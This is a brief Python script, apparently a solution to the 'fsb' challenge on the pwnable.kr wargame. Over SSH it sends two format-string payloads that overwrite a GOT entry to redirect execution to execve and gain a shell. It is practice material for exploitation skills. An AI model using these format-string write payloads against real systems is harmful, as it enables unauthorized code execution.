from pwn import *

context(log_level="debug", arch="i386", os="linux")

s = ssh(host='pwnable.kr', port=2222, user="fsb", password="guest")
r = s.process("./fsb")

# r = process(["./fsb", ">/dev/null", "2&>1"])

r.sendafter('(1)\n', '%134520836c%14$n')  # sleep@got
r.sendafter('(2)\n', '%134514335c%20$n')  # execve
r.interactive()
